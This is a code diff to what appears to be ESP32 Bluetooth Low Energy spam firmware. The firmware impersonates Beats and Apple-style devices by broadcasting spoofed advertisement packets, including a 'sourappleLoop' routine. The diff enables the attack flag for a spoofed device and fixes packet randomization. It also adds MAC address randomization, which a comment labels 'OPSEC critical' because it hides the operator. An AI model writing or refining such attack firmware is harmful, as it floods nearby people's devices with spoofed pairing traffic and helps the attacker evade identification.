@@ -530,9 +530,10 @@ void Beats_Studio_Pro() {
   attack_state = 1;
 }
 
-void Betas_Fit_Pro() {
+void Beats_Fit_Pro() {
   device_choice = 0;
   device_index = 15;
+    attack_state = 1;
 }
 
 void Beats_Studio_Buds_Plus() {
@@ -615,7 +616,7 @@ void setAdvertisingData() {
       Beats_Studio_Pro();
       break;
     case 16:
-      Betas_Fit_Pro();
+      Beats_Fit_Pro();
       break;
     case 17:
       Beats_Studio_Buds_Plus();
@@ -703,8 +704,11 @@ void toggleAdvertising() {
       for (int i = 0; i < 6; i++) {
         dummy_addr[i] = random(256);
         if (i == 0) {
-          dummy_addr[i] |= 0xF0;
+          dummy_addr[i] |= 0xC0; // FIXED: was 0xF0, 0xC0 = valid BLE random static address
         }
+    // BUGFIX: Apply random MAC to the BLE stack (was never applied - OPSEC critical)
+    esp_ble_gap_set_rand_addr((uint8_t*)dummy_addr);
+    BLEDevice::setOwnAddrType(BLE_ADDR_TYPE_RANDOM);
       }
 
       BLEAdvertisementData oAdvertisementData = getAdvertismentData();
@@ -1053,7 +1057,7 @@ BLEAdvertisementData getOAdvertisementData() {
   packet[i++] = 0x05;
   packet[i++] = 0xC1;
   const uint8_t types[] = { 0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0 };
-  packet[i++] = types[rand() % sizeof(types)];
+  packet[i++] = types[random(sizeof(types))];
   esp_fill_random(&packet[i], 3);
   i += 3;
   packet[i++] = 0x00;
@@ -1105,8 +1109,11 @@ void sourappleLoop() {
   for (int i = 0; i < 6; i++) {
     dummy_addr[i] = random(256);
     if (i == 0) {
-      dummy_addr[i] |= 0xF0;
+      dummy_addr[i] |= 0xC0; // FIXED: was 0xF0, 0xC0 = valid BLE random static address
     }
+    // BUGFIX: Apply random MAC to the BLE stack (was never applied - OPSEC critical)
+    esp_ble_gap_set_rand_addr((uint8_t*)dummy_addr);
+    BLEDevice::setOwnAddrType(BLE_ADDR_TYPE_RANDOM);
   }
   BLEAdvertisementData oAdvertisementData = getOAdvertisementData();
 
